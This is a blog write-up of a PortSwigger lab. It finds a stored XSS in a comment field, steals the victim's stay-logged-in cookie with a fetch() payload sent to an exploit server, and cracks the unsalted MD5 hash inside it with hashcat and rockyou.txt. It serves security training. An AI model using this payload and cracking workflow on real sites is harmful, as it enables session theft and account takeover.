+++
title = "Authentication Vulnerabilities: Lab 9: Offline password cracking after stealing user session cookie via xss"
date = 2025-11-10
lastmod = 2025-11-10
draft = false
author = "bloodstiller"
description = "PortSwigger authentication lab write-up how to steal a cookie via xss and then crack offline using hashcat"
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "authentication",
  "login",
  "username-enumeration",
  "response-timing",
  "portswigger-labs",
  "xss",
  "cookie",
  "ctf-writeup",
  "python",
  "hashcat",
  "john",
  "cracking",
  "md5"
]
keywords = [
  "authentication vulnerabilities",
  "timing attacks",
  "password cracking",
  "PortSwigger authentication lab",
  "web security",
  "login brute force",
  "python hacking"
]
toc = true
bold = true
next = true
+++

## Lab 9: Offline password cracking: {#lab-9-offline-password-cracking}

> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
>
> Your credentials: wiener:peter
> Victim's username: carlos


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

As usual we have a simple web application and a "My account" page &amp; access to the exploit server which we will send the stolen cookie too.
![](/ox-hugo/2025-11-10_04-49.png)


#### Logging in to View Cookie: {#logging-in-to-view-cookie}

As we know we need to steal the user's cookie value via an XSS vulnerability &amp; we know the vulnerability is in the comment section, let's first login as our user "wiener" &amp; tick the "Stay logged in" box so we can determine the name of the cookie and its contents.
![](/ox-hugo/2025-11-10_05-00.png)

Looking at the cookie in the inspector we can see the below we can see there are two cookies, the "stay-logged-in" cookie and the standard session cookie.
![](/ox-hugo/2025-11-10_05-02.png)
As we can see the standard session cookie has the "secure" &amp; "HttpOnly" flags set meaning that we cannot target it (we know this but it's good to check)

-   <https://owasp.org/www-community/HttpOnly>
-   <https://owasp.org/www-community/controls/SecureCookieAttribute>


#### Decoding The Base64 Encoded Cookie Contents: {#decoding-the-base64-encoded-cookie-contents}

Looking at the cookie value we can take a guess and assume it's a base64 encoded string, however if you are unsure you can always throw it in hashes.com
![](/ox-hugo/2025-11-10_05-07.png)

```shell
echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
```

{{< figure src="/ox-hugo/2025-11-10_05-09.png" >}}

Now I know this is an MD5 hash from experience and also contextually as I have been doing these labs &amp; MD5 has been the standard so far. However, I understand that may not be obvious for some readers so an easy way to identify the hash type is by using either <https://hashes.com/en/tools/hash_identifier>  or `hashid` in kali.


##### Using hashid &amp; hashes.com To Identify The Hash Type: {#using-hashid-and-hashes-dot-com-to-identify-the-hash-type}

```shell
hashid "51dc30ddc473d43a6011e9ebba6ca770"
```

{{< figure src="/ox-hugo/2025-11-07_07-17.png" >}}

Now that output is pretty messy as it could be ANY of those right. Well we can also use online tools such as <https://hashes.com/en/tools/hash_identifier>

{{< figure src="/ox-hugo/2025-11-07_07-18.png" >}}


##### Using md5sum to Encode our Password: {#using-md5sum-to-encode-our-password}

We can also do a simple a check by hashing our password with md5sum and then checking it against the base64 encoded cookie value.

```shell
echo -n peter | md5sum | awk '{print $1}'
```

{{< figure src="/ox-hugo/2025-11-10_05-12.png" >}}

As we can see it matches.


#### Why This Is Bad: {#why-this-is-bad}

This means our cookie value is "username:[hashed md5 password with no salt]" then this is encoded in base64&#x2026;if you hadn't guessed it this is really insecure, couple this with not using "HttpOnly" or "Secure" cookie values and you have a recipe for disaster.


### Enumerating The Stored XSS Vulnerability: {#enumerating-the-stored-xss-vulnerability}

We know there is a stored xxs vulnerability and looking at the articles we have the ability to leave a comment and include our name, email &amp; website. Let's enumerate what field(s) are vulnerable.

We can fill all injection points with the payload below &amp; modify the string to include the field name so we can determine which field is vulnerable.

```html
<script>console.log("xsstest [fieldname]:"location.origin</script>)
```

{{< figure src="/ox-hugo/2025-11-10_05-23.png" >}}

When we try and submit the payloads we get a popup regarding the format of the email address &amp; website fields. It appears it's parsing these field's to ensure they have the correctly formatted strings in them.
No way round.
![](/ox-hugo/2025-11-10_05-24.png)
![](/ox-hugo/2025-11-10_05-25_1.png)
+Note+: We could use a work-around for these types of validations however for this lab it is unnecessary so we will just focus on the fields that are not validating our input.

This leaves us with the "Comment" &amp; "Name" fields.

{{< figure src="/ox-hugo/2025-11-10_05-27.png" >}}

When we submit these payloads they successful post.
![](/ox-hugo/2025-11-10_05-27_1.png)

Now to validate our stored XSS we will ensure the console is open &amp; reload the page. As we can see we get a hit for the comment section so we know there an xss vulnerability in the comment field.

{{< figure src="/ox-hugo/2025-11-10_05-28.png" >}}


### Crafting An XSS Payload To Steal The Users Cookie: {#crafting-an-xss-payload-to-steal-the-users-cookie}

Now we need to use our attack server to act as an endpoint to send carlos' cookie once the xss exploit retrieves it.

We can take the exploit server url &amp; append place that in our payload so it becomes.

```html
<body onload="fetch('[explloitServerUrl'+document.cookie)">
```

We then submit this as a commment.
![](/ox-hugo/2025-11-10_05-36.png)

Now when go back to the exploit server page we can check the "Access log" to see what has accessed the exploit server url.
![](/ox-hugo/2025-11-10_05-39.png)

As we can see the exploit server has been accessed and it has the "stay-logged-in" cookie.
![](/ox-hugo/2025-11-10_05-38.png)
+Note+: It also has the string "(Victim)" in the "user-agent" so that's a dead giveaway.

Let's base64 decode it.

```shell
echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
```

As we can see it's carlos' cookie!
![](/ox-hugo/2025-11-10_05-40.png)


### Cracking Carlos' Hash With Hashcat: {#cracking-carlos-hash-with-hashcat}

Now we need to crack the hash so let's put the hash in a file.

```shell
echo "26323c16d5f4dabff3bb136f2460a943" >> lab9.hash
```

{{< figure src="/ox-hugo/2025-11-10_05-45.png" >}}

Now what you may notice is if we try and use the provided wordlist for this, the password will not be found.
However there is a hint to why this is in the preceeding section:

> In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. **Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine**. This demonstrates the importance of salt in effective encryption.

Now we could just paste this into hash into our search engine but that's a bad idea on a real engagement so let's use a well known password list, `rockyou.txt`.

+Note+: rockyou.txt is available by default in kali, under `/usr/share/wordlists/rockyou.txt.gz` (it's compressed compressed so you will need to decompress with `gunzip rockyou.txt.gz /user/share/wordlists/rockyou.txt.gz`

We can use hashcat to decrypt the password using hashcat.

```shell
hashcat lab9.hash -m 0 /usr/share/wordlist/rockyou.txt
```

As you can see we get a hit for `onceuponatime`
![](/ox-hugo/2025-11-10_05-47.png)

Let's login with these creds.
![](/ox-hugo/2025-11-10_05-48.png)

As we can see we can login.
![](/ox-hugo/2025-11-10_05-49.png)

Finally we delete carlos' account to solve the lab after we are prompted again to enter the password.
![](/ox-hugo/2025-11-10_05-49_1.png)

Lab solved.
![](/ox-hugo/2025-11-10_05-50.png)
